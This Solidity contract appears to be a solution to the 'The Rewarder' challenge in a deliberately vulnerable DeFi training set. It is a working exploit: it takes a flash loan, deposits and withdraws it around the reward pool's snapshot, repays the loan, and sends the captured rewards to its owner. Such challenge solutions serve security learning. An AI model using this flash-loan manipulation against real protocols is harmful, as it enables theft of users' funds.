// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "solady/src/utils/SafeTransferLib.sol";
import { TheRewarderPool } from "../TheRewarderPool.sol";
import { FlashLoanerPool } from "../FlashLoanerPool.sol";
import { RewardToken } from "../RewardToken.sol";
import { DamnValuableToken } from "../../DamnValuableToken.sol";

/**
 * @title TheRewarderAttacker
 * @author y0ng0p3 (https://github.com/y0ng0p3)
 */
contract TheRewarderAttacker {
    address private immutable owner;

    // Pool that's offering rewards
    TheRewarderPool private immutable rewarderPool;
    FlashLoanerPool private immutable flashLoanerPool;
    DamnValuableToken private immutable liquidityToken;
    RewardToken private immutable rewardToken;

    constructor(address _rewarderPool, address _flashLoanerPool, address _liquidityToken, address _rewardToken) {
        owner = msg.sender;

        rewarderPool = TheRewarderPool(_rewarderPool);
        flashLoanerPool = FlashLoanerPool(_flashLoanerPool);
        liquidityToken = DamnValuableToken(_liquidityToken);
        rewardToken = RewardToken(_rewardToken);
    }

    function attack() external {
        require(msg.sender == owner, "only owner");

        uint256 flashLoanerPoolBalance = liquidityToken.balanceOf(address(flashLoanerPool));
        // borrow flash loaner pool balance
        flashLoanerPool.flashLoan(flashLoanerPoolBalance);
    }

    function receiveFlashLoan(uint256 _amount) public {
        // approve rewarder pool to spend money in behalf of this contract
        SafeTransferLib.safeApprove(address(liquidityToken), address(rewarderPool), _amount);

        // deposit the amount borrowed into rewarder pool
        // this amount must be large greater than the one already deposited in the pool
        rewarderPool.deposit(_amount);
        // remove the borrowed money from rewarder pool
        rewarderPool.withdraw(_amount);
        // pay the borrowed money back to the flash loaner pool
        SafeTransferLib.safeTransfer(address(liquidityToken), address(flashLoanerPool), _amount);

        uint256 rewardBalance = rewardToken.balanceOf(address(this));
        SafeTransferLib.safeTransfer(address(rewardToken), owner, rewardBalance);
    }
}